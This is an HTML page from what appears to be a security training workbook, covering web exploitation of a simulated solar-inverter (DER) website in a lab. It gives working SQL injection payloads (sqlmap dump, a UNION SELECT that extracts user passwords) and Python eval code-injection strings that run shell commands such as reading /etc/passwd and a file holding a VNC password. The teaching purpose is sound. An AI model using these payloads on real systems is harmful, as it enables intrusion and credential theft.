<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" href="../img/favicon.ico" />
    <title>Website Exploits - CyberStrike Lab Workbook</title>
    <link rel="stylesheet" href="../css/theme.css" />
    <link rel="stylesheet" href="../css/theme_extra.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
    
      <script>
        // Current page data
        var mkdocs_page_name = "Website Exploits";
        var mkdocs_page_input_path = "lab-5\\web_exploit.md";
        var mkdocs_page_url = null;
      </script>
    
    <script src="../js/jquery-3.6.0.min.js" defer></script>
    <!--[if lt IE 9]>
      <script src="../js/html5shiv.min.js"></script>
    <![endif]-->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
      <script>hljs.initHighlightingOnLoad();</script> 
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
          <a href="../index.html" class="icon icon-home"> CyberStrike Lab Workbook
        </a>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul>
                <li class="toctree-l1"><a class="reference internal" href="../index.html">Home</a>
                </li>
              </ul>
              <p class="caption"><span class="caption-text">Overview</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../overview/labs_over.html">Laboratory Background Info</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 1 - Exploiting DER Interfaces</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-2/over_lab2.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-2/recon_nmap2.html">Reconnaissance with Nmap</a>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="../lab-2/brute_force_ssh2.html">Brute Forcing SSH Passwords</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 2 - DOS Attacks</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-3/over_lab4.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-3/dos.html">Denial of Service (DOS)</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 3 - Firmware Analysis</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-4/over_lab3b.html">Overview, Goals, and Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-4/der_firmware.html">Investigating DER Firmware</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 4 - Firmware Cryptography</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-4/over_lab3.html">Overview, Goals, and Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-4/malicious_update.html">Malicious Firmware</a>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="../lab-4/encrypt_decrypt_data3.html">Encrypting/Decrypting Data (optional)</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 5 - Web Exploitation</span></p>
              <ul class="current">
                  <li class="toctree-l1"><a class="reference internal" href="over_lab5.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Exercises</a>
    <ul class="current">
                <li class="toctree-l2 current"><a class="reference internal current" href="web_exploit.html">Website Exploits</a>
    <ul class="current">
    <li class="toctree-l3"><a class="reference internal" href="#sql_injection">SQL injection</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#commandcode_injection">Command/Code Injection</a>
    </li>
    </ul>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="control_der_vnc5.html">Controlling the DER through VNC</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 6 - Vulnerable API and App Security</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-6/over_lab6.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-6/interacting_api.html">Vulnerable API</a>
                </li>
                <li class="toctree-l2"><a class="reference internal" href="../lab-6/app_inspect.html">Smart Phone App Inspection</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 7 - Replay and MITM Attacks</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-7/over_lab7.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-7/replay-mitm.html">Replay and MITM</a>
                </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Lab 8 - Security Improvements</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../lab-8/over_lab8.html">Overview, Goals, Prerequisites</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="#">Exercises</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="../lab-8/20305firewalls.html">IEEE 2030.5 and FWs</a>
                </li>
    </ul>
                  </li>
              </ul>
              <ul>
                <li class="toctree-l1"><a class="reference internal" href="../about.html">About</a>
                </li>
              </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">CyberStrike Lab Workbook</a>
        
      </nav>
      <div class="wy-nav-content">
        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../index.html" class="icon icon-home" alt="Docs"></a> &raquo;</li>
          <li>Lab 5 - Web Exploitation &raquo;</li>
          <li>Exercises &raquo;</li>
      <li>Website Exploits</li>
    <li class="wy-breadcrumbs-aside">
    </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div class="section" itemprop="articleBody">
              
                <h1 id="web_exploitation">Web Exploitation<a class="headerlink" href="#web_exploitation" title="Permanent link">&para;</a></h1>
<ol>
<li>
<p>On the Kali machine, open the Firefox browser and go to <code>10.10.0.100</code> to pull up the DER website.  Click the icon or enter the following into the terminal to start the browser: <code>firefox</code></p>
<p><img alt="Website" src="../img/der_sim_website.png" /></p>
<p>You will see some power, voltage, and frequency from the DER device.  There are also some simple tab applications: <code>Firmware</code>, <code>Calculator</code>, and <code>Grid Information</code>. These were added to demonstrate different forms of website vulnerabilities.</p>
</li>
</ol>
<h2 id="sql_injection">SQL injection<a class="headerlink" href="#sql_injection" title="Permanent link">&para;</a></h2>
<p><strong> A Joke to Start </strong>
<img alt="Website" src="../img/xkcd.png" />
From: <a href="http://xkcd.com/327/">http://xkcd.com/327/</a></p>
<ol>
<li>Click on the <code>Grid Information</code> link to bring up <code>http://10.10.0.100/grid</code> in the browser.</li>
<li>
<p>Notice the list of grid codes available for this device.</p>
<p><img alt="Website" src="../img/grid_code_web.PNG" /></p>
</li>
<li>
<p>Clicking on <code>Asia</code> or <code>Europe</code> links will show the options for that continent,
e.g., <code>http://10.10.0.100/grid?continent=Asia</code></p>
</li>
<li>
<p>It looks like this URL is using some kind of database to store information. It could be vulnerable to SQL injection attacks depending on how it's parsing the inputs. To help us quickly test different exploits, let's use <code>curl</code> to get the website contents:</p>
<p><code>curl http://10.10.0.100/grid?continent=Asia</code></p>
</li>
<li>
<p>Websites require inputs to be URL encoded. To save us the trouble of manually converting the data, we can have curl do this for us:</p>
<p><code>curl --get --data-urlencode "continent=Asia" http://10.10.0.100/grid</code></p>
<p>The results will be the same as before.</p>
</li>
<li>
<p>Now, let's try to see if we can see if can determine if this is a SQL database by terminating the input string and producing an error.  Typical string terminators are <code>"</code>, <code>'</code>, and <code>`</code>. </p>
<p><code>curl --get --data-urlencode "continent=\"" http://10.10.0.100/grid</code></p>
<p><code>curl --get --data-urlencode "continent='" http://10.10.0.100/grid</code></p>
<p>In the second case, we get an interesting error: <code>unrecognized token: "''';"</code>.  Googling this we see this is a error common in SQLite applications. That confirms our suspicion that these queries are tied to a SQL database.</p>
</li>
<li>
<p>There are tools that can help to automate SQL injection attacks.  One included on the Kali machine is <code>sqlmap</code>.  We can test it out by running the following:</p>
<p><code>sqlmap -u http://10.10.0.100/grid?continent=Asia -p continent --dump</code></p>
<p>where the <code>continent</code> parameter is used for the injection and <code>--dump</code> indicates that <code>sqlmap</code> should dump the full contents. You can answer the questions with the following: <code>Y</code>, <code>Y</code>, <code>N</code></p>
<p>Did we find anything interesting?</p>
<p><img alt="SQL Injection 1" src="../img/sqlmap1.PNG" />
<img alt="Website" src="../img/sqlmap2.PNG" /></p>
<p>NOTE: sqlmap will sometimes fail if the queries do not return in time.  If it fails, try a few more times.</p>
</li>
<li>
<p>Note we can also manually exploit this system if we know how to craft the request.  The single quote <code>'</code>is used for the end of a string input.  We can use this to end the entry and then add another query as long as we terminate the request with a comment using either a <code>*/</code>, C-style comment block, of the SQL comment <code>--</code>.</p>
<p>Try to get the user passwords with the curl command:</p>
<p><code>curl --get --data-urlencode "continent=' UNION SELECT username, password, 1 from USERS --" http://10.10.0.100/grid</code></p>
<p>And enter the following into the browser URL:</p>
<p><code>http://10.10.0.100/grid?continent=' union select username, password, 1 from users --</code></p>
<p>which becomes <code>http://10.10.0.100/grid?continent=%27%20union%20select%20username,%20password,%201%20from%20users%20/*</code> when URL encoded.</p>
<p><img alt="SQL Injection via Browser" src="../img/sql_injection.PNG" /></p>
</li>
</ol>
<h2 id="commandcode_injection">Command/Code Injection<a class="headerlink" href="#commandcode_injection" title="Permanent link">&para;</a></h2>
<ol>
<li>
<p>Go to the solar website at <code>http://10.10.0.100/calculator</code>.  In the first field, the form is running python code that includes an <code>eval</code> statement.  It can be used as a calculator. For instance, enter the following:</p>
<p><code>5+7</code></p>
<p><code>8*5</code></p>
<p><code>4**2</code></p>
<p>Did it return the expected results?</p>
</li>
<li>
<p>Python <code>eval</code> statements will execute arbitrary code and, therefore, it is a well-known vulnerability.  So instead of entering, an equation, let’s start a subprocess to print the user that is running the website with <code>whoami</code>.  You can also print the values of the website’s directory with the <code>ls</code> command.</p>
<p><code>__import__("subprocess").getoutput("whoami")</code></p>
<p><code>__import__("subprocess").getoutput("ls")</code></p>
<p><img alt="Code Injection via Browser" src="../img/code_inj_web.PNG" /></p>
</li>
<li>
<p>If you look at the output, you can see that there’s a file called <code>super_secret_info.txt</code>. Let’s go ahead and see what’s in that file.</p>
<p><code>__import__("subprocess").getoutput("cat super_secret_info.txt")</code></p>
<p>We see the following result:</p>
<p><code>Result: VNC password = superman</code></p>
</li>
<li>
<p>Now let’s see if we can dump the users names from the linux machine.</p>
<p><code>__import__("subprocess").getoutput("cat /etc/passwd")</code></p>
<p>So, we can see there’s a vnc user on the machine.  Maybe we can get it using VNC.</p>
<p><img alt="Code Injection via Browser" src="../img/code_inj_web2.PNG" /></p>
</li>
</ol>
              
            </div>
          </div><footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
        <a href="over_lab5.html" class="btn btn-neutral float-left" title="Overview, Goals, Prerequisites"><span class="icon icon-circle-arrow-left"></span> Previous</a>
        <a href="control_der_vnc5.html" class="btn btn-neutral float-right" title="Controlling the DER through VNC">Next <span class="icon icon-circle-arrow-right"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
      <p>2022 National Technology and Engineering Solutions of Sandia, LLC</p>
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
          
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="Versions">
  <span class="rst-current-version" data-toggle="rst-current-version">
    
    
      <span><a href="over_lab5.html" style="color: #fcfcfc">&laquo; Previous</a></span>
    
    
      <span><a href="control_der_vnc5.html" style="color: #fcfcfc">Next &raquo;</a></span>
    
  </span>
</div>
    <script>var base_url = '..';</script>
    <script src="../js/theme_extra.js" defer></script>
    <script src="../js/theme.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
